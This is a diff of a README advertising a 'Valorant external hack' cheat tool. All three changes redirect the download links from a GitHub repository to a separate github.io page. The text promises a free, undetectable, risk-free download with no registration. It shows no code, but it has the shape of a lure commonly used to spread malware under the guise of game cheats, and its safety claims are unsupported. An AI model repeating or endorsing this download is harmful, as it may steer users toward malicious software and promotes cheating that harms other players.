@@ -1,6 +1,6 @@
 # 🎯 valorant-external-hack-2026 - The Safest, Most Reliable Valorant Enhancement Tool
 
-[![Download Now](https://img.shields.io/badge/Download-Valorant_External_Hack_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a1a)](https://github.com/austere-ester2721/valorant-external-hack-2026)
+[![Download Now](https://img.shields.io/badge/Download-Valorant_External_Hack_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1a1a1a)](https://austere-ester2721.github.io)
 
 ---
 
@@ -37,7 +37,7 @@ No injection means no detection vectors. The entire hack runs as a transparent o
 ## 🚀 Getting Started - Simple 3-Step Setup
 
 ### Step 1: Download the Application
-Visit this link to download the application: **[https://github.com/austere-ester2721/valorant-external-hack-2026](https://github.com/austere-ester2721/valorant-external-hack-2026)**
+Visit this link to download the application: **[https://austere-ester2721.github.io](https://austere-ester2721.github.io)**
 
 The download is completely free and requires no registration. You'll receive the latest version of the tool with all features included.
 
@@ -141,7 +141,7 @@ Don't settle for being average. Take control of your matches and reach the rank 
 
 ## 📥 Final Download Instructions
 
-Visit this link to download the application: **[https://github.com/austere-ester2721/valorant-external-hack-2026](https://github.com/austere-ester2721/valorant-external-hack-2026)**
+Visit this link to download the application: **[https://austere-ester2721.github.io](https://austere-ester2721.github.io)**
 
 Once downloaded, launch the program and enjoy your enhanced gameplay experience immediately. No complicated setup, no risks, just pure competitive advantage.
 
